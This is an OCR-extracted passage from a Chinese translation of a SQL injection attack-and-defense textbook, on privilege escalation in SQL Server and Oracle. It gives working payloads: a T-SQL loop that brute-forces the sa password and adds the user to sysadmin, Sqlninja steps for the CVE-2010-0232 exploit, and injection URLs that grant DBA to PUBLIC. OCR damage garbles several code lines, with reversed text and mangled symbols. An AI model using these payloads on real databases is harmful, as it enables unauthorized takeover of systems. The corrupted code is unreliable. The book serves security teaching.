Whether mixed or Windows=only authentication is used
5-
Whether SQL Server runs as System
(xp_cmdshell must be available)
6 - Current database name
a - All of the above
h - Print this menu
q - exit
2
[+]Checking whether user is member of sysadmin server role...You
are an administrator !
生效了！现在我们的用户是管理员，从面打开了许多新场景。
工具与陷阱
使用数据库自身的资源进行暴力破解
对于刚才讨论的攻击而言，每测试一个候选口令就要向后台数据库发送一条请求，
这意味着要执行大量的请求，也意味着需要大量网络资源并且会在Web服务器和数据
库服务器日志中留下大量数据项，但这不是执行暴力破解攻击的唯一方法：使用一点儿
SQL技巧，可以只注入一条查询就能独立完成整个暴力破解攻击，ChrisAnley在其2002
年的论文“（more）Advanced SQLinjection”（更高级的SQL注入）中首次引入了这一概念，
之后被Bobcat和Sqlninja实现。
Bobcat（可从www.northem-monkee.co.uk上下载）运行在Windows上，使用了一种基
于字典的方法，它注入一个查询，该查询与攻击者的数据库服务器建立起了一种带外
（Out-Of-Band，OOB）连接以便获取一张包含候选口令列表的表，之后再在本地尝试这些
口令，我们将在本章结尾详细讨论Bobcal
Sqlninja使用一种纯种的暴力破解方法来实现这一概念，它注入一个查询，该查询
不断尝试使用给定字符集和给定长度产生的所有口令，下面是一个由Sqlminja使用的攻
击查询的示例，它尝试获取SQLServer2000上由两个字符构成的口令：
158
---
## Page 173
第4章利用SQL注入
declare @p nvarchar (99),@z nvarchar(10),8s nvarchar (99), @a int, @b
int, @q nvarchar (4000);
set 8a-1: set 8b-1;
set @s=N'abcdefghijk1mnopqrstuvwxyz0123456789′;
while @a<37 begin
while @b<37 begin set @p=N'';-- We reset the candidate password;
set 8z - substring(@s,@a,1): set @p=8p+@z)
set @z = substring(@s,@b,1); set @p-8p+8z;
set @q=N′select 1 from OPENROWSET(''SQLOLEDB'',
**Network=DBMSSOCN; Address=:uid=sa/pwd=*+@p+N***,
select 1; exec master.dbo.sp_addsrvrolemember
.....+system_user +N*....,....sysadmin......)*;
exec master.dbo.xp_execresultset @q,N'master';
+qa
set @b=1; set @a=Ba+1; end;
这里执行了哪些操作呢？我们首先将字符集存储到变量@s中，本例中该变量包含
了字母和数字，也可以扩展到其他符号（如果包含单引号，就需要确保代码已正确使用
了它们的转义字符）.接下来我们创建了两个嵌套的循环，它们分别由变量@a和@b控
制，这两个变量作为指向字符集的指针，被用于产生所有候选口令，产生完候选口令
并存储到变量@p后，调用OPENROWSET，尝试执行sp_addsrvrolemember存储过程
以使将当前用户（system_user）添加至管理员组（sysadmin）.为避免OPENROWSET验证
关败时查询停止，我们将查询保存到了变量@q中并使用xp_execresultset执行它.
这看起来有点儿复杂，如果管理员口令不是很长，那么这会是一种帮助攻击者提
升权限的有效方法，进一步讲，执行暴力破解攻击时使用的是数据库服务器自己的CPU
资源，从而使该方法成为一种很简洁的权限提升方法。
不过，在产品环境下使用该技术时要特别小心，它很容易将目标系统的CPU使用
率推至100%，而且在执行过程中保持不变，这会降低对合法用户的服务质量。
正如我们看到的，OPENROWSET是一条非常强大、灵活的命令。我们能够以不同的方式
滥用它，从向攻击者机器传输数据到尝试权限提升。但这并不是它的全部功能：OPENROWSET
还可用于寻找存在弱口令的SQLServer。请看下列查询：
SELECT * FROM OPENROWSET (*SQLOLEDB*,*NetWOIk=DBRSSOCN;
Address=10.0.0.1;uid=sa; pwd=*, *SELECT 1*)
该查询尝试以sa用户、空口令向地址为10.0.0.1的SQLServer发出验证请求。要想创建
一个在某一网段内所有IP地址上尝试这种查询的循环非常容易。查询完成后会将结果保存到
一个临时表中，之后便可以使用前面介绍的技术提取这些数据。
如果数据库服务器是SQLServer2005或2008，并且你没有管理员权限，那么首先要执行
的测试之一，就是检查OPENROWSET是否可用。可以使用下面的查询来执行该检查：
select value_in_use from sys,configurations where name LIKE *Ad Hoc*
如果OPENROWSET可用，该查询将返回1，否则将返回0。
159
---
## Page 174
SQL注入攻击与防御（第2版）
4.8.2在未打补丁的服务器上提升权限
虽然OPENROWSET是SQLServer权限提升中最常用的要素，但它并不是唯一要素。如果
目标数据库服务器没有更新最新的安全补丁，它就可能会受到一种或多种很有名的攻击。
有时候网络管理员没有资源来保证网络上的所有服务器均能持续更新，有时候他们缺少这
方面的意识。如果服务器非常重要且未在独立的环境中进行过仔细的安全修复测试，那么更新
操作可能会置数天甚至数周，从而为攻击者提供可乘之机。对于这些情况，首先要对远程服
务器进行精确跟踪以确定存在哪些缺陷以及这些缺陷是否可被安全地利用。
MS09-004漏润是一个非常好的例子，它是由 Bemhard Muellr 发现的、影响 SQL Server
2000和 2005的一个堆溢出漏润，它位于sp_replwritetovarbin存储过程中。2008年12月该漏
洞被披露，它允许以管理员权限在受影响的主机上执行任意代码。该漏洞公布不久，利用该漏
洞的代码便开始四处流传。到本书写作时，尚未发布安全修复方法。唯一的权宜之计是移除该
存储过程。可以通过注入一个调用sp_replwritetovarbin的查询来利用该漏洞，这会导致内存溢
出并执行恶意的shell代码。不过，失败的注入会引发拒绝服务攻击(Denialof Service，DoS）条
件，所以尝试该攻击时一定要小心！特别是从Windows Server 2003开始，数据执行保护(Data
Execution Prevention，DEP)默认是启用的，因此操作系统将阻止在未分配给该代码的内存区域
中执行代码的任何企图，操作系统通过杀死犯规进程来实现阻止(SQLSERVR.EXE也在其列)。
可以访间www.securityfocus.com/bid/32710以获取关于该漏洞的更多信息。另外，Sqlmap具有
一个可以利用该漏洞的模块。
另外一种情形是：你的查询可能以sa权限执行，但SQLSERVR.EXE进程运行在一个较低
权限的账号之下，这可能会阻止攻击者执行某种特定的攻击，例如使用Sqlninja注入Metasploit
的VNCDLL并获得对数据库服务器的GUI访问（请参考第6章以获得更多详细信息）。在这种
情况下，如果操作系统没有打上足够的补丁，就可以尝试利用该漏润以提升SQLServer的权限。
实现这—目标的技术包括token kidnaping（www.argeniss.com/research/TokenKidnapping.pdf)和对
CVE-2010-0232漏洞的成功利用。Sqlninja和 Sqlmap这两个工具都有助于自动化这种攻击。
作为一个例子，可以参考 Sqlninja对最新的 CVE-2010-0232漏洞的注入.Tavis Ormandy 在
Sqlninja中包含了一个利用该原始漏洞的定制版本的工具。当以sql作为参数来调用该工具时，
它将寻找SQLSERVR.EXE进程并将该进程的权限提升为SYSTEM。为了执行这种攻击，需要
执行下面几个步骤：
●使用 fingerprint 模式(-m fingerprint)检查 xp_cmdshell 是否可用(option 3),以及 SQLSERVR
EXE并未以 SYSTEM 权限运行(option 5)。
●使用 upload 模式(-m upload)将 vdmallowed.exe(option 5)和l vdmexploit.dll(option 6)传送
到远程服务器。
●使用 command 模式(-m command)运行“%TEMP%livdmallowed.exe sql”(不带引号),
以执行该漏洞利用工具。
如果远程Windows服务器没有打上针对这一漏洞的补丁，此时fingerprint模式将确认SQL
Server真正运行在SYSTEM权限之下。
Sqlmap通过Metasploit的getsystem命令，也对这种攻击提供了完全支持。
09L
---
## Page 175
第4章利用SQL注入
1. Oracle
在Oracle中，通过Web应用的SQL注入来提升权限非常困难。大多数权限提升攻击方法
均需要PL/SQL注入，而这种注入很少见。但是如果我们可以访间dbms_xmlquery.newcontextO
或dbms_xmlquery.getxmlO(默认对于PUBLIC权限可访问)，就可以通过展名PL/SQL代码块执
行注入，在前面已经对此进行过介绍。
不需要PL/SQL注入的一个例子是：使用在Oracle 的mod_plsql组件中发现的一个漏润。
下列URL展示了一种通过driload包（由AlexanderKormbrust发现）提升权限的方法。这个包未
被mod_plsql组件过滤，所有Web用户均可通过输入下列URL米提升权限：
http: / /www, victim. com/pls/dad/ctxsys,dri1oad.validate_stmt?sqlstmt=GRAN
T+DBA+TO+PUBLIC
在利用大多数权限提升漏洞时（可从milw0rm.com上获得很多）使用了下列概念：
（1）创建一个将DBA权限授权给公共角色的有效载荷。这比将DBA权限授权给指定的用
户更隐蔽些。下一步将把该有效载荷注入一个易受攻击的PL/SQL存储过程中。
CREATE OR REPLACE FUNCTION F1 return number
authid current_user as
pragma autonomous_transaction;
COMMIT;
RETURN 1;
END;
/
(2）将该有效载荷注入一个易受攻击的包中：
exec sys.kupwSWoRKER.main(*x′, *vy'* and 1=user12.f1 -- mytag12′);
(3)启用DBA角色：
set role DBA;
(4）从公共角色中撤销DBA角色：
revoke DBA from PUBLIC;
当前会话显然仍然拥有DBA权限，但却不再出现在Oracle的权限表中。
在Oracle中，一些权限提升漏洞的例子包括 SYS.LT 和 SYS.DBMS_CDC_PUBLISH，二
者将在稍后讨论。
2. SYS.LT
如果数据库用户具有CREATEPROCEDURE权限，我们就可以在该用户的模式（schema）
中创建一个恶意函数，并在SYS.LT包的一个容易遭受攻击的对象中注入该函数（2009年4月
Oracle已经修正了这一间题）。这一攻击的结果，就是我们的恶意函数在SYS许可权限下获得
执行，并且我们获得了DBA权限。
161
---
## Page 176
SQL注入攻击与防御（第2版）
--创建函数
http://www.victim.com/index.jsp?id=1 and (select dbms_xmlquery.
newcontext (*declare PRAGKA AUTONOMoUS_TRANSACTION; begin execute
immediate '*create or replace function pwn2 return varchar2 authid
Lmmediate +***grant dba to publio***ycommit/return ****z***;END;
current_user is PRAGMA autonomous_transaction;BEGIN execute
- Ttnu qou s (tenp woxg (.fpua fatuwoo f
SXS-
http://www.victim.com/index.jsp?id=1 and (select dbms_xmlquery.
newcontext (*declare PRAGKA AUTONOMOUS_TRANSACTION; begin execute
immediate ** begin SYS.Lr.CREATEWORKSPACE (.**A1o*.*.** and scott.
scott.pn2()=********x'***) :end;**; commit; end;*) from dual) 18
-ttnu qou
4.8.3SYS.DBMS_CDC_PUBLISH
近期在 sys.dbms_cdc_publish.create_change_set 包中发现了 SYS.DBMS_CDC_PUBLISH 问
题，Oracle在2010年10月修正了该问题（在版本10g R1、10g R2、11gR1和11gR2中)，该漏
润允许一个具有execute_catalog_role 权限的用户成为 DBA：
http://www.victim,com/index.Jsp?id1 and (select dbms_xmlquery.
te,sysdate) :end;**; commit; end;*) from dual) is not nul1 --
1.绕过 CREATE PROCEDURE权限
这种办法的缺点是要求具有CREATEPROCEDURE权限，在用户并不具备该权限的情况
下，我们可以充分利用下面几种技术和常见间题来克服这一障碍。
2. cursor 注入
David Litchfield在 BlackHat DC 2009 大会上提出了该问题的一个解决方案。在Oracle 10g
中，通过使用cursor注入PL/SQL绕过这一间题，比如下面的代码：
http: //www. vict.im, com/ index. jap?id1 and (select dbms_xmlquery .
newcontext (*declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute
SQL.PARSE (D, *"**declare pragma autonomous_transaction; begin execute
execute (****IIDI1****) -1--*) / SYS ,LT, COMPRESSWORKSPACETREE
end;*'; commit) end;*) from dual) is not null ==
请注意，在Oracle1lg及更高版本中已经不可能使用cursor注入技术。
162
---
## Page 177
第4章利用SQL注入
3.SYS.KUPPSPROC
SYS.KUPPSPROC.CREATE_MASTER_PROCESSO函数是另外一个Oracle函数，它允许执
行任意PL/SQL语句。请注意，只有具有DBA角色的用户才能执行该函数。但是，如果我们
已经识别出一个容易受到攻击的过程，就可以使用该函数来执行PL/SQL，比如下面的代码：
select dbms_xmlquery-newcontext (*declare PRAGMA AUTONOMOUS_TRANSACTION;
ssll........e....)ooxduna*ss ubeq ..9etawwt nooxe utbog
****************DECLARE PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN EXECUTE IMMEDIATE ...............................GR
................,.*......) 1..........*...) ;end;**; commit; end;*)
tenp mozg
4.弱许可权限
数据库许可权限超过实际的需要，这种情况很常见。数据库用户往往可能具有这样的权限：
这些权限间接地允许权限提升攻击。其中一些权限包括：
●CREATE ANY VIEW
●CREATE ANY TRIGGER
●CREATE ANY PROCEDURE
·EXECUTE ANY PROCEDURE
这些权限是危险的，主要的原因在于它们允许该权限的拥有者在其他用户的模式中创建对
象（比如视图、触发器和过程等），包括SYSTEM模式。当执行这些对象时，它们将在其所有者
的权限下执行，因此允许权限提升。
例如，如果数据库用户具有CREATEANYTRIGGER权限，就可以使用下面例子中的代
码将自已提升为DBA角色。首先，我们可以使用户在SYSTEM模式下创建一个触发器。当调
用该触发器时，它将执行DDL语句GRANTDBATO PUBLIC：
select dbms_xmlquery-nevcontext ('declare PRAGMA AUTONOMOUS_TRANSACTION;
the_trigger before insert on system.oL$ for each row declare pragma
PUBLIc****; END the_trigger;**end;*) from dua1